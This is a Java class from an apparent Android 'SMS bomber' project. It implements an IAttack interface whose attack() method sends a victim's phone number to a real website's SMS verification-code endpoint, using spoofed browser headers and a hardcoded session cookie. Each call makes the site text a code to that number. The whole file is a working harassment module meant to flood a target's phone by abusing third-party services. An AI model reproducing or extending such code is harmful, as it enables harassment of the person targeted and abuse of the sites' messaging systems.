package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Phtfdata implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "mobileNo=" + Utils.getNumber(MainApplication.context) + "&validType=0";

        Request request = new Request.Builder()
                .url("https://www.phtfdata.com/web/chkcode/sendCheckCode.do")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "JSESSIONID=DA19174706404481B022B2BF58B7EAE5; Hm_lvt_7e003406797650fc7c7e00072b608bb4=1450269335; Hm_lpvt_7e003406797650fc7c7e00072b608bb4=1450269344; Hm_lvt_3796e708ae2de3b32e4e3dfaaa5982ad=1450269340; Hm_lpvt_3796e708ae2de3b32e4e3dfaaa5982ad=1450269340; barIndex=0")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
